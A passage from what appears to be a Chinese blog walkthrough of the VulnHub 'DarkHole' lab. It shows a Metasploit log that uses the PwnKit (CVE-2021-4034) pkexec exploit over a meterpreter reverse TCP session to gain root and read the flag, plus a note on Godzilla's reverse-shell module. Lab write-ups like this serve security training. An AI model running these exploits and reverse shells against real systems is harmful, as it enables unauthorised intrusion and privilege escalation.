+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 exploit(multi/handler) &gt; use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec<br>[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp<br><br>msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) &gt; sessions <br><br>Active sessions<br>===============<br><br>  Id  Name  Type                   Information          Connection<br>  --  ----  ----                   -----------          ----------<br>  1         meterpreter php/linux  www-data @ darkhole  192.168.1.5:4444 -&gt; 192.168.1.4:37968 (192.168.1.4<br>                                                        )<br><br>msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) &gt; <span class="hljs-built_in">set</span> session 1<br>session =&gt; 1<br>msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) &gt; run<br><br>[*] Started reverse TCP handler on 192.168.1.5:4444 <br>[*] Running automatic check (<span class="hljs-string">&quot;set AutoCheck false&quot;</span> to <span class="hljs-built_in">disable</span>)<br>[!] Verify cleanup of /tmp/.dhoapptcyi<br>[+] The target is vulnerable.<br>[*] Writing <span class="hljs-string">&#x27;/tmp/.bhwmihxok/xtkbwpd/xtkbwpd.so&#x27;</span> (548 bytes) ...<br>[!] Verify cleanup of /tmp/.bhwmihxok<br>[*] Sending stage (3045380 bytes) to 192.168.1.4<br>[+] Deleted /tmp/.bhwmihxok/xtkbwpd/xtkbwpd.so<br>[+] Deleted /tmp/.bhwmihxok/.jqyjmbhdcuu<br>[+] Deleted /tmp/.bhwmihxok<br>[*] Meterpreter session 2 opened (192.168.1.5:4444 -&gt; 192.168.1.4:37970) at 2025-02-08 23:00:06 +0800<br>meterpreter &gt;<br></code></pre></td></tr></table></figure>
+<p>（6）成功提权到<code>root</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; getuid<br>Server username: root<br></code></pre></td></tr></table></figure>
+
+<p><strong>读取flag</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; shell<br>Process 12372 created.<br>Channel 1 created.<br><span class="hljs-built_in">cat</span> /root/root.txt<br>DarkHole&#123;You_Are_Legend&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>（1）哥斯拉可以使用模块<code>PMeterpreter</code>进行反弹shell<br>（2）Polkit（以前称为 PolicyKit）是一个用于在类 Unix 操作系统中控制系统范围权限的组件。它为非特权进程与特权进程通信提供了一种有组织的方式。也可以使用 polkit 执行具有提升权限的命令，使用命令 pkexec 后跟要执行的命令（具有 root 权限）。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/vulnhub/" class="category-chain-item">vulnhub</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="print-no-link">#文件上传</a>
+      
+        <a href="/tags/%E6%8F%90%E6%9D%83-pwnkit/" class="print-no-link">#提权-pwnkit</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>DarkHole</div>
+      <div>http://miao-sec.github.io/vulnhub/DarkHole/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Miao</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年6月20日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              BY-MIAO
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/vulnhub/Hackable3/" title="Hackable3">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Hackable3</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/vulnhub/Hackathon/" title="Hackathon">
+                        <span class="hidden-mobile">Hackathon</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         次
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
